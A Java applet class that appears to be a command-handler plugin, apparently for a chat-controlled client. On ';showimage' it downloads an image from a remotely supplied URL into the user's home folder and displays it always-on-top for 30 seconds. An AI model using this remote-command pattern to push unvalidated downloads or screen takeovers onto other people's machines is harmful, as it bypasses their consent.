
import java.applet.Applet;
import java.awt.Frame;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.MediaTracker;
import java.awt.Toolkit;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class ShowImage extends Applet implements Handler {

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";showimage")) {
            try {
                new File(System.getProperty("user.home") + "\\image.jpg").delete();
                getAndSaveImage(args[1]);
                loadImage();
                showImage();
                return true;
            } catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }
        return true;
    }

    public void randomFile() {
    }

    public void showImage() {
        Applet applet = new ShowImage();
        Frame frame = new Frame();
        frame.setTitle("Sent Image");
        frame.setAlwaysOnTop(true);
        frame.setResizable(false);
        frame.add(applet);
        int height = loadImage().getHeight(applet) + 20;
        int width = loadImage().getWidth(applet);
        frame.setSize(width, height);
        frame.show();
        try {
            Thread.sleep(30000);
        } catch (InterruptedException ex) {
            Logger.getLogger(ShowImage.class.getName()).log(Level.SEVERE, null, ex);
        }
        frame.dispose();
    }

    public Image loadImage() {
        Image result = null;
        MediaTracker tracker = new MediaTracker(new ShowImage());
        Toolkit toolkit = Toolkit.getDefaultToolkit();
        result = toolkit.getImage(System.getProperty("user.home") + "\\image.jpg");
        tracker.addImage(result, 0);
        try {
            tracker.waitForAll();
        } catch (InterruptedException e) {
            return null;
        }
        return result;
    }

    public boolean getAndSaveImage(String image)
            throws IOException {
        File file = new File(System.getProperty("user.home") + "\\image.jpg");
        URL _url = new URL(image);
        OutputStream out = new BufferedOutputStream(new FileOutputStream(file));
        URLConnection conn = _url.openConnection();
        InputStream in = conn.getInputStream();
        byte[] buffer = new byte[1024];
        int read;
        while ((read = in.read(buffer)) != -1) {
            out.write(buffer, 0, read);
        }
        out.flush();
        in.close();
        out.close();
        return true;
    }

    @Override
    public void paint(Graphics g) {
        Image sea = loadImage();
        g.drawImage(sea, 0, 0, null);
    }
}
